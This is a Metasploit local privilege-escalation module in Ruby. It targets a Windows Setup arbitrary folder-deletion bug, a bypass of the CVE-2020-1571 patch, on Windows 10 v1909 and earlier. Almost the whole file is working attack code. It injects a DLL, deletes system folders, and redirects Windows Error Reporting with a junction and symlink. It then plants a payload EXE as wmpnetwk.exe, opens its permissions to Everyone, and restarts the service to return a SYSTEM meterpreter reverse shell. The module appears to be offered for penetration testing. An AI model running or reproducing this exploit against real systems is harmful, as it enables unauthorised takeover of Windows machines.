##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking
  include Msf::Exploit::EXE # Needed for generate_payload_exe
  include Msf::Post::Windows::FileSystem # Needed for create_symlink
  include Msf::Exploit::FileDropper # Needed for register_file_for_cleanup
  include Msf::Post::File # Needed for upload_file
  include Msf::Post::Windows::ReflectiveDLLInjection # Needed for inject_dll_into_process

  def initialize(info = {})
    super(
        update_info(
          info,
          'Name' => 'Windows Setup Arbitrary File Deletion Local Privilege Escalation',
          'Description' => %q{
            This module exploits an oversight when patching CVE-2020-1571 where Microsoft correctly changed the Windows Setup program's behavior
            so that it removed a Time-Of-Check-Time-Of-Use bug when creating the directory C:\$WINDOWS.~BT, however they forgot to check whether
            or not this folder was a reparse point prior to deleting the directory. Attackers can exploit this vulnerability to delete arbitrary
            folders on the system as the SYSTEM user, which can be used to gain code execution as SYSTEM via known DLL hijacking issues within
            Windows.

            Note that this module will only work on Windows 10 v1909 and prior. This is noted by the author who found this bug, and I'm guessing
            this is due to the need for their to be a new version of Windows that one can upgrade to, and since v2004 is the latest at the time of
            writing, there is no way to trigger the functionality needed to exploit this bug on that version of the operating system. Its possible
            that once Windows 20H2 comes out, this bug will also be exploitable on Windows 10 v2004 machines though, as Microsoft has noted that
            Windows 10 v2004 machines were also vulnerable to this bug when they wrote up the advisory for CVE-2020-1571.
          },
          'License' => MSF_LICENSE,
          'Author' =>
              [
                'klinix5', # Aka Abdelhamid Naceri, who was the original finder of CVE-2020-1571 and who found the bypass in the patch.
                'gwillcox-r7', # msf module
                'jonaslyk' # Directory deletion to SYSTEM shell technique and assistance with questions.
              ],
          'Platform' => ['win'],
          'SessionTypes' => ['meterpreter'],
          'Privileged' => true,
          'Arch' => [ARCH_X86, ARCH_X64],
          'Targets' =>
              [
                [ 'Windows DLL Dropper', { 'Arch' => [ARCH_X86, ARCH_X64], 'Type' => :windows_dropper } ],
              ],
          'DefaultTarget' => 0,
          'DisclosureDate' => '2020-08-11',
          'References' =>
              [
                ['CVE', '2020-1571'],
                ['URL', 'https://github.com/klinix5/Windows-Setup-EoP'],
                ['URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html'],
                ['URL', 'https://secret.club/2020/04/23/directory-deletion-shell.html'],
              ],
          'Notes' =>
              {
                'SideEffects' => [ CONFIG_CHANGES ],
                'Reliability' => [ UNRELIABLE_SESSION ],
                'Stability' => [ CRASH_SAFE ]
              },
          'DefaultOptions' =>
              {
                'EXITFUNC' => 'thread',
                'PrependMigrate' => true,
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
                'WfsDelay' => 900
              }
        )
    )
    register_options(
      [
        OptString.new('WritableDir', [ true, 'The location of a directory the current user can write to', 'C:\\Windows\\Temp\\' ]),
        OptInt.new('WaitTime', [ true, "Number of minutes to wait for the reflectively injected DLL's operations to complete before continuing", 10 ]),
      ]
    )
  end

  def move_folders_out_of_wer
    relocation_dir = "#{datastore['WritableDir']}\\#{Rex::Text.rand_text_alpha(6..13)}"
    vprint_status('Making the temp folder which will house the folders that we move out of the WER directory...')
    mkdir(relocation_dir)
    register_dir_for_cleanup(relocation_dir)

    vprint_status("cd'ing to relocation directory and relocating the folders...")
    cd(relocation_dir)
    vprint_status('Moving files out of the WER directory into the relocation directory...')

    # I was going to use rename_file here but it doesn't forcibly move folders when we run it under a Meterpreter session.
    # So yeah this is hacky but it works much more reliably and is the same command that rename_file does for Windows sessions,
    # its just me forcing it to do it for Meterpreter as a workaround. Feel free to fix this up if Meterpreter does eventually
    # get fixed to address this issue.
    cmd_exec('cmd.exe /C "move /Y C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive ."')
    cmd_exec('cmd.exe /C "move /Y C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue ."')
    cmd_exec('cmd.exe /C "move /Y C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp ."')

    vprint_status('Changing directory back to the writable directory...')
    cd(datastore['WritableDir'])
    vprint_good('Successfully moved the folders out of C:\\ProgramData\\Microsoft\\Windows\\WER!')
  end

  def create_wer_job
    cmd_exec('schtasks /end /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting')
    sleep(2)
    cmd_exec('schtasks /run /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting')
    sleep(5)
  end

  def exploit
    print_status('Loaded!')
    target_dir = 'C:\\$WINDOWS.~BT'
    session.fs.dir.rmdir(target_dir.to_s) if directory?(target_dir.to_s)
    session.fs.file.rm(target_dir.to_s) if file?(target_dir.to_s)

    process = client.sys.process.open
    reflective_dll_path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2020-1571', 'CVE-2020-1571.x64.dll')
    exploit_mem, offset = inject_dll_into_process(process, reflective_dll_path)

    print_status('Payload injected. Executing exploit...')
    process.thread.create(exploit_mem + offset)
    print_status('Please go to Settings, Check for Updates, and then click Download and Install under the section titled Feature Update.')
    print_status("Sleeping for #{datastore['WaitTime']} minutes whilst the update process takes place and the DLL runs...")
    sleep(60 * datastore['WaitTime'])

    if directory?('C:\\Program Files\\Windows Media Player')
      fail_with(Failure::Unknown, "The directory C:\\Program Files\\Windows Media Player still exists, so exploit didn't complete successfully!")
    elsif directory?('C:\\ProgramData\\Microsoft\\Windows\\WER')
      fail_with(Failure::Unknown, "The directory C:\\ProgramData\\Microsoft\\Windows\\WER still exists, so exploit didn't complete successfully!")
    end

    print_good('Exploit successfully deleted the WER and Windows Media Player directories!')

    print_status('Using schtasks to run the QueueReporting task to create the WER directory with open permissions...')
    cmd_exec('schtasks /end /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    cmd_exec('schtasks /run /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    sleep(3)
    cmd_exec('schtasks /end /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')

    unless directory?('C:\\ProgramData\\Microsoft\\Windows\\WER')
      print_error("Something went wrong, the WER directory wasn't recreated!")
    end
    move_folders_out_of_wer

    print_status('Creating mount point between the WER directory and \\RPC Control..')
    mount_point_handle = create_mount_point('\\??\\C:\\ProgramData\\Microsoft\\Windows\\WER', '\\RPC Control')
    if mount_point_handle.nil?
      fail_with(Failure::Unknown, 'Error when creating the directory junction... aborting.')
    end
    print_good('Created the directory junction successfully!')

    symlink_handle = create_symlink(nil, '\\RPC Control\\Temp', '\\??\\c:\\Program Files\\Windows Media Player')
    unless symlink_handle
      fail_with(Failure::Unknown, 'Error when creating the wermgr.exe.local symlink... aborting.')
    end
    print_good('Created the symbolic link between \\RPC Control\\Temp and \\??\\c:\\Program Files\\Windows Media Player successfully!')
    symlink_handle_value = symlink_handle['LinkHandle']

    print_status('Running the QueueReporting task again to create the folder C:\\Program Files\\Windows Media Player with open permissions...')
    cmd_exec('schtasks /run /TN "\\Microsoft\\Windows\\Windows Error Reporting\\QueueReporting"')
    sleep(5)
    exe = generate_payload_exe({ code: payload.encoded })
    write_file('C:\\Program Files\\Windows Media Player\\wmpnetwk.exe', exe)
    print_good('Created the malicious EXE at C:\\Program Files\\Windows Media Player\\wmpnetwk.exe')

    print_status('Setting the permissions on the malicious EXE at C:\\Program Files\\Windows Media Player\\wmpnetwk.exe so that everyone can access it...')
    cmd_exec('icacls "C:\\Program Files\\Windows Media Player\\wmpnetwk.exe" /grant *S-1-1-0:(F)')

    vprint_status('Closing symbolic link handle...')
    session.railgun.kernel32.CloseHandle(symlink_handle_value)
    vprint_good('Closed symlink handle!')

    vprint_status('Cleaning up by removing the WER junction directory...')
    session.railgun.kernel32.CloseHandle(mount_point_handle)
    session.fs.dir.rmdir('C:\\ProgramData\\Microsoft\\Windows\\WER')
    vprint_good('Removed the WER junction directory!')
    cmd_exec('net stop WMPNetworkSvc')
    cmd_exec('net start WMPNetworkSvc')
    print_good('Should be good to go, enjoy the shells!')
  end
end
